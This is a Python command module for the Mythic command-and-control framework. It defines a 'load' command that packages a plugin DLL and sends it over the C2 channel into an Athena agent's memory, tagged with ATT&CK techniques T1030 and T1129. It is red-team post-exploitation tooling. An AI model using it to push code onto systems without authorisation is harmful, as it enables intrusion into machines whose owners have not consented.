from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *

import json
import base64
import os



class LoadArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


class LoadCommand(CommandBase):
    cmd = "load"
    needs_admin = False
    help_cmd = "load cmd"
    description = "This loads a new plugin into memory via the C2 channel."
    version = 1
    author = "@checkymander"
    parameters = []
    attackmapping = ["T1030", "T1129"]
    argument_class = LoadArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = os.path.join(self.agent_code_path, "AthenaPlugins","bin", f"{task.args.command_line}.dll")
        dllBytes = open(dllFile, 'rb').read()
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(dllBytes),
                                              delete_after_fetch=True)        
        
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("file_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register keylogger DLL: " + file_resp.error)
        return task

    async def process_response(self, response: AgentResponse):
        pass

